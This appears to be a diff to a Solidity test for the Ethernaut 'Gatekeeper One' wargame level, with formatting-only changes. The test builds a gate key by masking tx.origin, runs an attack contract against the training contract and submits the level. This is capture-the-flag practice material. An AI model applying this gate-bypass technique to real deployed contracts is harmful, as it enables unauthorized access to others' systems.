@@ -29,11 +29,11 @@ contract GatekeeperOneTest is DSTest {
         //////////////////
         // LEVEL ATTACK //
         //////////////////
-        
-        // it could be 0xFFFFFFFF0000FFFF, 0xFFFF00000000FFFF, 0x0000FFFF0000FFFF;         
+
+        // it could be 0xFFFFFFFF0000FFFF, 0xFFFF00000000FFFF, 0x0000FFFF0000FFFF;
         emit log_named_address("entrant address before exploit", ethernautGatekeeperOne.entrant());
         AttackGatekeeperOne attacker = new AttackGatekeeperOne(ethernautGatekeeperOne);
-        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF; 
+        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
         attacker.attack(gateKey);
         emit log_named_address("entrant address after exploit", ethernautGatekeeperOne.entrant());
         assertEq(ethernautGatekeeperOne.entrant(), tx.origin, "entrant address is not equal to tx.origin");
@@ -41,9 +41,7 @@ contract GatekeeperOneTest is DSTest {
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
-        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
-            payable(levelAddress)
-        );
+        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
         assert(levelSuccessfullyPassed);
     }
